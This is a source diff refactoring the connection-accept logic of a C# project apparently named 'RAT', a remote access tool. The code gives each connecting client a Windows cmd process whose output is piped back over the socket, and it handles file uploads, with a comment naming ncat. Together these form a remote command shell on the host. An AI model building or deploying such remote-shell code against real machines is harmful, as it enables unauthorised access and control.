@@ -1,9 +1,7 @@
-﻿using RAT.Cmd;
-using RAT.Interfaces;
+﻿using RAT.Interfaces;
 using RAT.Models;
 using RAT.Models.Enums;
 using System;
-using System.Diagnostics;
 using System.Net.Sockets;
 
 namespace RAT.Logic.Sockets.Connection
@@ -14,15 +12,15 @@ namespace RAT.Logic.Sockets.Connection
     public class SocketConnectionAcceptLogic : ISocketConnectionAcceptLogic
     {
         private readonly ISocketStateLogic _socketStateLogic;
-        private readonly ISocketConnectionReceiveLogic _socketConnectionReceiveLogic;
         private readonly ICmdLogic _cmdLogic;
+        private readonly ISocketConnectionReceiveLogic _socketConnectionReceiveLogic;
 
         /// <summary>
         /// Logic related to connection acceptance stage.
         /// </summary>
         /// <param name="stateLogic">Our client socket state logic.</param>
         /// <param name="receiveLogic">Logic for data receival.</param>
-        /// <param name="cmdLogic">Windows cmd logic.</param>
+        /// <param name="cmdLogic">Logic for cmd.</param>
         public SocketConnectionAcceptLogic(
             ISocketStateLogic stateLogic,
             ISocketConnectionReceiveLogic receiveLogic,
@@ -56,35 +54,19 @@ namespace RAT.Logic.Sockets.Connection
             Socket handler = listener.EndAccept(res);
 
             // Check if we are waiting for file upload.
+            // As if we are, then request for new connection will come (i.e from ncat).
             if (_socketStateLogic.State.FileUploadInformation?.FileUploadProgress == FileUploadProgress.Begins)
             {
                 _socketStateLogic.State.FileUploadInformation.ClientFileUploadSocket = handler;
-                _socketConnectionReceiveLogic.BeginFileDataReceive(handler);
+                _socketConnectionReceiveLogic.BeginFileReceive(handler);
                 return;
             }
 
-            // Create the state object with cmd process attached to client.
-            // This represents client with all needed information.
-            var clientState = new StateObject()
-            {
-                ClientMainSocket = handler,
-                FileUploadInformation = new FileUploadInformation(),
-                ClientCmdProcess = new Process()
-                {
-                    StartInfo = new CmdConfigurator().GetCmdStartupConfiguration(),
-                },
-            };
+            // Create new client with connection.
+            var clientState = _socketStateLogic.CreateNewState(handler);
 
-            _socketStateLogic.SetState(clientState);
-
-            // Cmd output handler which will redirect output and error result to client after command is executed.
-            clientState.ClientCmdProcess.OutputDataReceived += new DataReceivedEventHandler(_cmdLogic.CmdOutputDataHandler);
-            clientState.ClientCmdProcess.ErrorDataReceived += new DataReceivedEventHandler(_cmdLogic.CmdOutputDataHandler);
-
-            // Launch cmd process.
-            clientState.ClientCmdProcess.Start();
-            clientState.ClientCmdProcess.BeginOutputReadLine();
-            clientState.ClientCmdProcess.BeginErrorReadLine();
+            // Launch shell for client.
+            clientState.ClientCmdProcess = _cmdLogic.CreateNewCmdProcess();
 
             // We are ready to receive cmd commands.
             _socketConnectionReceiveLogic.BeginCommandReceive(handler);
